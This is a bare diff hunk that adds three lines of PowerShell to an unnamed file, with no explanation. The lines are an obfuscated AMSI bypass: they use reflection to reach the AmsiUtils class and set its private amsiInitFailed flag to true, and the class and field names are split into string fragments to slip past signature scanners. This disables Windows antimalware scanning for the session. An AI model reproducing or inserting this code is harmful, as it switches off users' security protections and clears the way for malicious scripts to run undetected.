@@ -1,0 +1,3 @@
+$asmi = [Ref].Assembly.GetType('Sy'+'st'+'em.Man'+'ageme'+'nt.Au'+'toma'+'tion.A'+'msiUtils');
+$field = $asmi.GetField('am'+'siI'+'nitF'+'ailed','No'+'nP'+'u'+'blic,S'+'tat'+'ic');
+$field.SetValue($null,$true)
